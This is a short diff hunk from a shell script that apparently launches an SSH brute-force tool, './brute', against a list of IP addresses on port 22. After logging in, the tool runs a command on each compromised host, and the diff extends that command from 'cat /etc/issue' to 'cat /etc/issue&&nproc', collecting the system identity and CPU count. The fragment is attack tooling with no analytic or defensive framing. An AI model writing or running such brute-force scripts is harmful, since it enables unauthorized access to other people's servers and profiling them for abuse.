@@ -40,4 +40,4 @@ echo "######################################################################"
 sleep 2
 echo "BRUTE STARTING !"
 sleep 1
-./brute 5000 -f ips.lst naffey 22 "cat /etc/issue"
+./brute 5000 -f ips.lst naffey 22 "cat /etc/issue&&nproc"
